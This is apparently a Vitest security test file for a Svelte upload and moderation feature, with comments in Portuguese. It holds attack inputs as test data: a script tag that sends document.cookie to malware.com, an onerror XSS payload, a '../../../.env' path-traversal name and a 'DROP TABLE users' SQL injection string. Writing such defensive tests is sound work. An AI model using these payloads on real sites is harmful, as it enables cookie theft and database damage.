import { describe, it, expect } from "vitest";
import { z } from "zod";
import { fileTypeFromBuffer } from "file-type";

// Esquema de validação igual ao usado nas rotas
const uploadSchema = z.object({
  comment: z
    .string()
    .max(500)
    .nullable()
    .transform((v) => v || ""),
  media: z.instanceof(File),
});

describe("Vetor de Ataque: XSS (Cross-Site Scripting)", () => {
  it("deve barrar comentários que excedam o limite para evitar injeções massivas", () => {
    const maliciousScript =
      "<script>fetch('http://malware.com?cookie=' + document.cookie)</script>";
    const longPayload = maliciousScript.repeat(10); // Excede 500 chars

    const result = uploadSchema.safeParse({
      comment: longPayload,
      media: new File([""], "test.jpg", { type: "image/jpeg" }),
    });

    expect(result.success).toBe(false);
  });

  it("deve permitir comentários com caracteres especiais mas que serão escapados pelo Svelte", () => {
    // Svelte escapa automaticamente strings no template: {post.comment}
    // Testamos se o Zod permite a entrada para que o Svelte cuide da saída.
    const payload = "<img src=x onerror=alert(1)>";
    const result = uploadSchema.safeParse({
      comment: payload,
      media: new File([""], "test.jpg", { type: "image/jpeg" }),
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.comment).toBe(payload);
    }
  });
});

describe("Vetor de Ataque: File Upload Bypass (Magic Bytes)", () => {
  it("deve detectar quando um arquivo HTML é renomeado para .jpg", async () => {
    // Conteúdo HTML real
    const fakeJpegContent =
      "<html><body><h1>Não sou um JPEG</h1></body></html>";
    const buffer = Buffer.from(fakeJpegContent);

    // Simula a detecção que usamos no server
    const detect = await fileTypeFromBuffer(buffer);

    // O file-type deve retornar undefined ou algo que não seja image/jpeg
    expect(detect?.mime).not.toBe("image/jpeg");
  });

  it("deve validar corretamente um arquivo JPEG real (Magic Bytes)", async () => {
    // Header real de um JPEG (FF D8 FF)
    const realJpegBuffer = Buffer.from([
      0xff, 0xd8, 0xff, 0xdb, 0x00, 0x43, 0x00,
    ]);
    const detect = await fileTypeFromBuffer(realJpegBuffer);

    expect(detect?.mime).toBe("image/jpeg");
  });
});

describe("Vetor de Ataque: Path Traversal", () => {
  it("não deve permitir caminhos relativos no nome do arquivo (Zod/Sanitização)", () => {
    // No nosso código usamos crypto.randomUUID() para gerar o nome no S3
    // Mas testamos se o input original do arquivo não afetaria a lógica.
    const maliciousName = "../../../.env";
    const file = new File(["content"], maliciousName, { type: "image/jpeg" });

    // A lógica de extração da extensão deve ser segura
    const extension = file.type.split("/")[1];
    expect(extension).not.toContain("..");
    expect(extension).toBe("jpeg");
  });
});

const moderateSchema = z.object({
  postId: z
    .string()
    .regex(/^\d+$/)
    .transform((v) => BigInt(v)),
  action: z.enum(["approve", "reject", "ban"]),
});

describe("Vetor de Ataque: Broken Access Control (BAC) & IDOR", () => {
  it("deve rejeitar IDs de post não numéricos (Injeção de Tipo)", () => {
    const result = moderateSchema.safeParse({
      postId: "123; DROP TABLE users",
      action: "approve",
    });
    expect(result.success).toBe(false);
  });

  it("deve rejeitar ações não permitidas (Injeção de Comando)", () => {
    const result = moderateSchema.safeParse({
      postId: "123",
      action: "delete_database", // Ação fora do enum
    });
    expect(result.success).toBe(false);
  });

  it("deve validar IDs de posts extremamente grandes (BigInt Safety)", () => {
    const hugeId = "9223372036854775807"; // Max 64-bit int
    const result = moderateSchema.safeParse({
      postId: hugeId,
      action: "reject",
    });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.postId).toBe(BigInt(hugeId));
    }
  });
});
